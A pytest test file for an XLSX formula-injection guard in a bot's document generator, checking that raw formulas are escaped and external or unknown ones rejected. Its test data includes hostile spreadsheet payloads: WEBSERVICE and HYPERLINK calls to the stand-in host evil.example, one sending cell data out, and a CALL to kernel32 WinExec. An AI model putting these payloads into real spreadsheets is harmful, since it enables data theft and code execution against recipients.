from __future__ import annotations

from pathlib import Path

import pytest


def test_raw_formula_like_strings_are_written_as_text():
    from bot.modules.atri_xlsx_formula_guard import install_atri_xlsx_formula_guard
    from bot.modules import atri_document_runtime as documents

    install_atri_xlsx_formula_guard()
    assert documents._cell_value("=HYPERLINK(\"https://evil.example\",\"click\")") == (
        "'=HYPERLINK(\"https://evil.example\",\"click\")"
    )
    assert documents._cell_value("=1+1") == "'=1+1"


def test_explicit_local_formula_object_is_allowed():
    from bot.modules.atri_xlsx_formula_guard import install_atri_xlsx_formula_guard
    from bot.modules import atri_document_runtime as documents

    install_atri_xlsx_formula_guard()
    assert documents._cell_value({"formula": "=SUM(A2:A10)"}) == "=SUM(A2:A10)"
    assert documents._cell_value({"formula": "=IF(A1=1,MAX(B1:B3),0)"}) == (
        "=IF(A1=1,MAX(B1:B3),0)"
    )


@pytest.mark.parametrize(
    "formula",
    [
        '=HYPERLINK("https://evil.example","click")',
        '=WEBSERVICE("https://evil.example/"&A1)',
        "='[external.xlsx]Sheet1'!A1",
        "=SUM(Sheet2!A1:A3)",
        '=CALL("kernel32","WinExec","JJ","calc",1)',
        "=UNKNOWNFUNC(A1)",
        "=_xlfn.WEBSERVICE(A1)",
        '=_xlfn.RTD("prog.id",,"topic")',
        "=_xlws.UNKNOWNFUNC(A1)",
    ],
)
def test_explicit_external_or_unknown_formula_is_rejected(formula: str):
    from bot.modules.atri_xlsx_formula_guard import install_atri_xlsx_formula_guard
    from bot.modules import atri_document_runtime as documents

    install_atri_xlsx_formula_guard()
    with pytest.raises(documents.DocumentBridgeError, match="XLSX_FORMULA"):
        documents._cell_value({"formula": formula})


def test_workbook_reopen_distinguishes_safe_formula_from_raw_data(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    from openpyxl import load_workbook
    from bot.modules.atri_xlsx_formula_guard import install_atri_xlsx_formula_guard
    from bot.modules import atri_document_runtime as documents

    install_atri_xlsx_formula_guard()
    monkeypatch.setattr(documents, "ARTIFACT_DIR", tmp_path / "documents")
    result = documents.execute_document_spec(
        {
            "version": 1,
            "format": "xlsx",
            "filename": "formula-safety.xlsx",
            "sheets": [
                {
                    "name": "Data",
                    "rows": [
                        ["raw", "safe_formula"],
                        [
                            '=HYPERLINK("https://evil.example","click")',
                            {"formula": "=SUM(1,2,3)"},
                        ],
                    ],
                }
            ],
        }
    )
    path = Path(result["artifact_path"])
    workbook = load_workbook(path, data_only=False)
    sheet = workbook["Data"]
    try:
        assert sheet["A2"].data_type == "s"
        assert sheet["A2"].value.startswith("'=HYPERLINK")
        assert sheet["B2"].data_type == "f"
        assert sheet["B2"].value == "=SUM(1,2,3)"
    finally:
        workbook.close()


def test_xlsx_skill_context_supersedes_legacy_raw_equals_formula_rule():
    from bot.modules.atri_xlsx_formula_guard import install_atri_xlsx_formula_guard
    from bot.modules import atri_skills

    install_atri_xlsx_formula_guard()
    context = atri_skills.skill_vertex_context(
        {
            "names": ["xlsx"],
            "selected": [],
            "truncated": [],
            "omitted": [],
        }
    )
    assert "ATRI_XLSX_FORMULA_SAFETY_V1541" in context
    assert '{"formula":"=SUM(A2:A10)"}' in context
    assert "raw '=...' string will be escaped as text" in context


def test_v1541_guard_is_installed_before_atri_ai_import_path():
    source = Path("bot/__init__.py").read_text(encoding="utf-8")
    assert "ATRI_XLSX_FORMULA_SAFETY_V1541_BOOT" in source
    assert "install_atri_xlsx_formula_guard()" in source
